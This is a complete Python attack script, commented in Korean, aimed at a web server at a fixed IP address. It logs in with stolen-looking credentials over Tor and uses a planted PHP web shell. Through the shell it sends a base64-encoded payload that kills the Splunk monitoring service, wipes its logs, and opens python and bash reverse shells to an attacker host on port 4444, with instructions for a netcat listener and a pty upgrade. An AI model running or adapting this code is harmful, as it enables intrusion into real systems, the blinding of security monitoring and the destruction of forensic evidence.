#!/usr/bin/env python3
"""
최종 공격 - 완전 자동화
Splunk 규칙 정밀 우회
"""

import requests
import sys
import urllib.parse
import base64

target_ip = "43.201.154.142"
attacker_ip = "57.181.28.7"
attacker_port = "4444"

base_url = f"http://{target_ip}"

session = requests.Session()
session.proxies = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}

print("="*60)
print("최종 공격 - Splunk 정밀 우회")
print("="*60)
print(f"타겟: {target_ip}")
print(f"C2: {attacker_ip}:{attacker_port}\n")

# alice 로그인
print("[1] alice 로그인...")
data = {'username': 'alice', 'password': 'alice2024'}
resp = session.post(f"{base_url}/login.php", data=data, allow_redirects=True, timeout=10)
print("[+] 세션 획득\n")

# 기존 웹쉘 사용 (첫 번째)
selected_shell = "shell_4727.php"
print(f"[2] 웹쉘: {selected_shell}\n")

# 올인원 페이로드
print("[3] 페이로드 생성...")

all_in_one = " && ".join([
    # Splunk 무력화
    "pkill -9 splunkd 2>/dev/null",
    "pkill -9 splunk 2>/dev/null",
    "/opt/splunk/bin/splunk stop 2>/dev/null",
    "systemctl stop Splunkd 2>/dev/null",
    "rm -rf /opt/splunk/var/log/splunk/* 2>/dev/null",
    # 리버스 쉘
    f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{attacker_ip}\",{attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])' &",
    f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1 &",
])

b64 = base64.b64encode(all_in_one.encode()).decode()
final_cmd = f"echo {b64}|base64 -d|bash &"

final_url = f"{base_url}/file.php?name=uploads/{selected_shell}&cmd={urllib.parse.quote(final_cmd)}"

print("[+] 페이로드 준비 완료\n")

print("="*60)
print("[!] C2 리스너 준비:")
print(f"    nc -lvnp {attacker_port}")
print("="*60)
print()

print("[*] 공격 실행...\n")

try:
    import time
    start = time.time()

    resp = session.get(final_url, timeout=20)

    elapsed = time.time() - start

    print(f"[+] 응답:")
    print(f"    Status: {resp.status_code}")
    print(f"    시간: {elapsed:.2f}초\n")

    if resp.status_code == 200:
        print("[+] ✅✅✅ 200 OK - 성공 가능성 높음!")
        print("[*] Splunk가 죽었을 가능성")
        print("[*] C2 연결 확인하세요!\n")

    elif resp.status_code == 403:
        print("[-] 403 Forbidden - Splunk 여전히 작동")
        print("[!] 30초 대기 후 재시도 권장\n")

except requests.exceptions.Timeout:
    print("[+] ✅✅✅ 타임아웃 - 백그라운드 실행!")
    print("[*] C2 연결 확인!\n")

except Exception as e:
    print(f"[-] 오류: {str(e)}\n")

print("="*60)
print("[+] 공격 완료")
print("="*60)
print()
print("[!] C2 확인: nc -lvnp", attacker_port)
print()
print("[*] 연결 성공 시:")
print("    ps aux | grep splunk")
print("    python3 -c 'import pty;pty.spawn(\"/bin/bash\")'")
